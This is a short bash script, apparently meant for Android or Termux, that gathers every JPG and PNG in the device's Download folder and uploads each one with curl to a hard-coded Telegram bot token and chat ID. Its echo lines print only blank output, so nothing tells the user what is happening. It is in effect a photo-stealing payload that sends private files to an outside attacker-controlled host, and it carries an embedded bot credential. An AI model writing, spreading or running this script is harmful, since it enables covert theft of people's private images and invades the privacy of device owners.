#!/bin/bash

# Telegram bot token
BOT_TOKEN="6223370595:AAHetPeO0RN3OTU28RRaIyoTyQhZWgFP0SA"

# Telegram chat ID
CHAT_ID="5136260272"

# Find all image and PNG files in the SD card
images=$(find /sdcard/Download/ -type f \( -name "*.jpg" -o -name "*.png" \))

CAPTION=" 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝙱𝚢: @Dark_X369 "
# Check if any images were found
if [ -z "$images" ]; then

    exit 1
fi

# Send each image to Telegram bot
for image in $images; do
    echo ""
    curl --silent --show-error --fail -F "photo=@$image" -F "caption=$CAPTION" "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto?chat_id=$CHAT_ID"
    if [ $? -eq 0 ]; then
        echo ""
    else
        echo ""
    fi
done